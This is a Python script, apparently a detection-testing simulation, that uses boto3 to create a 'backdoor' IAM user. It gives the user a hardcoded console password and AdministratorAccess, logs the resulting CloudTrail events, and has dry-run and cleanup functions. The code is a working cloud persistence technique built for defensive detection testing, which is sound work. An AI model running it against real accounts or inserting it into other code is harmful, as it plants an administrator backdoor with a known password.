import argparse
import logging
import sys
import time
from typing import Optional

import boto3
from botocore.exceptions import ClientError

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
    level=logging.INFO,
    stream=sys.stdout,
)
log = logging.getLogger("cdet001-sim")

# ---------------------------------------------------------------------------
# CloudTrail events this simulation generates
# ---------------------------------------------------------------------------
CLOUDTRAIL_EVENTS = [
    "iam:CreateUser            → eventName=CreateUser",
    "iam:CreateLoginProfile    → eventName=CreateLoginProfile",
    "iam:AttachUserPolicy      → eventName=AttachUserPolicy",
    "iam:CreateAccessKey       → eventName=CreateAccessKey  (if --with-key flag used)",
]

ADMIN_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"


# ---------------------------------------------------------------------------
# Core simulation functions
# ---------------------------------------------------------------------------

def print_cloudtrail_events() -> None:
    """Print the CloudTrail events that will be (or were) generated."""
    log.info("CloudTrail events generated by this simulation:")
    for event in CLOUDTRAIL_EVENTS:
        log.info("  %s", event)


def create_iam_user(
    iam_client,
    username: str,
    dry_run: bool,
) -> Optional[str]:
    """
    Create a backdoor IAM user.

    Returns the user ARN on success, None on failure.
    """
    if dry_run:
        log.info("[DRY-RUN] Would call: iam.create_user(UserName='%s')", username)
        log.info("[DRY-RUN] Would call: iam.create_login_profile(UserName='%s', Password=..., PasswordResetRequired=False)", username)
        return f"arn:aws:iam::DRY-RUN-ACCOUNT:user/{username}"

    # WARNING: This creates a real IAM user in your AWS account.
    log.warning("EXECUTING: iam.create_user(UserName='%s') — this is a real write operation", username)
    try:
        response = iam_client.create_user(
            UserName=username,
            Tags=[
                {"Key": "CreatedBy", "Value": "CDET001-Simulation"},
                {"Key": "SimulationId", "Value": "CDET-001"},
                {"Key": "SafeToDelete", "Value": "true"},
            ],
        )
        user_arn = response["User"]["Arn"]
        log.info("Created IAM user: %s", user_arn)

        # WARNING: This enables console access for the new user.
        log.warning("EXECUTING: iam.create_login_profile() — enabling console access")
        iam_client.create_login_profile(
            UserName=username,
            Password="Cdet001-Temp-Pass!99",
            PasswordResetRequired=False,
        )
        log.info("Enabled console access (login profile) for: %s", username)
        return user_arn

    except ClientError as exc:
        log.error("Failed to create IAM user '%s': %s", username, exc)
        return None


def attach_admin_policy(
    iam_client,
    username: str,
    dry_run: bool,
) -> bool:
    """
    Attach AdministratorAccess managed policy to the user.

    WARNING: This grants full AWS administrative access.
    """
    if dry_run:
        log.info(
            "[DRY-RUN] Would call: iam.attach_user_policy(UserName='%s', PolicyArn='%s')",
            username,
            ADMIN_POLICY_ARN,
        )
        return True

    # WARNING: This grants AdministratorAccess to the IAM user.
    log.warning(
        "EXECUTING: iam.attach_user_policy — attaching AdministratorAccess to '%s'",
        username,
    )
    try:
        iam_client.attach_user_policy(
            UserName=username,
            PolicyArn=ADMIN_POLICY_ARN,
        )
        log.info("Attached AdministratorAccess to user: %s", username)
        return True
    except ClientError as exc:
        log.error("Failed to attach policy to '%s': %s", username, exc)
        return False


def cleanup_user(
    iam_client,
    username: str,
    dry_run: bool,
) -> None:
    """
    Remove all simulation artifacts: detach policies, delete login profile,
    delete access keys, and delete the IAM user.
    """
    if dry_run:
        log.info("[DRY-RUN] Cleanup would remove:")
        log.info("[DRY-RUN]   iam.detach_user_policy(UserName='%s', PolicyArn='%s')", username, ADMIN_POLICY_ARN)
        log.info("[DRY-RUN]   iam.delete_login_profile(UserName='%s')", username)
        log.info("[DRY-RUN]   iam.delete_access_key() for all keys")
        log.info("[DRY-RUN]   iam.delete_user(UserName='%s')", username)
        return

    log.info("Starting cleanup for user: %s", username)

    # Detach managed policies
    try:
        attached = iam_client.list_attached_user_policies(UserName=username)
        for policy in attached.get("AttachedPolicies", []):
            log.warning("EXECUTING: Detaching policy '%s' from '%s'", policy["PolicyArn"], username)
            iam_client.detach_user_policy(UserName=username, PolicyArn=policy["PolicyArn"])
            log.info("Detached policy: %s", policy["PolicyArn"])
    except ClientError as exc:
        log.warning("Could not list/detach policies for '%s': %s", username, exc)

    # Delete inline policies
    try:
        inline_policies = iam_client.list_user_policies(UserName=username)
        for policy_name in inline_policies.get("PolicyNames", []):
            log.warning("EXECUTING: Deleting inline policy '%s' from '%s'", policy_name, username)
            iam_client.delete_user_policy(UserName=username, PolicyName=policy_name)
    except ClientError as exc:
        log.warning("Could not list/delete inline policies for '%s': %s", username, exc)

    # Delete login profile
    try:
        log.warning("EXECUTING: iam.delete_login_profile(UserName='%s')", username)
        iam_client.delete_login_profile(UserName=username)
        log.info("Deleted login profile for: %s", username)
    except ClientError as exc:
        if exc.response["Error"]["Code"] != "NoSuchEntity":
            log.warning("Could not delete login profile for '%s': %s", username, exc)

    # Delete access keys
    try:
        keys = iam_client.list_access_keys(UserName=username)
        for key in keys.get("AccessKeyMetadata", []):
            key_id = key["AccessKeyId"]
            log.warning("EXECUTING: Deleting access key '%s' for '%s'", key_id, username)
            iam_client.delete_access_key(UserName=username, AccessKeyId=key_id)
            log.info("Deleted access key: %s", key_id)
    except ClientError as exc:
        log.warning("Could not list/delete access keys for '%s': %s", username, exc)

    # Remove from groups
    try:
        groups = iam_client.list_groups_for_user(UserName=username)
        for group in groups.get("Groups", []):
            log.warning("EXECUTING: Removing '%s' from group '%s'", username, group["GroupName"])
            iam_client.remove_user_from_group(UserName=username, GroupName=group["GroupName"])
    except ClientError as exc:
        log.warning("Could not remove '%s' from groups: %s", username, exc)

    # Delete the user
    try:
        log.warning("EXECUTING: iam.delete_user(UserName='%s')", username)
        iam_client.delete_user(UserName=username)
        log.info("Deleted IAM user: %s", username)
    except ClientError as exc:
        log.error("Failed to delete user '%s': %s", username, exc)


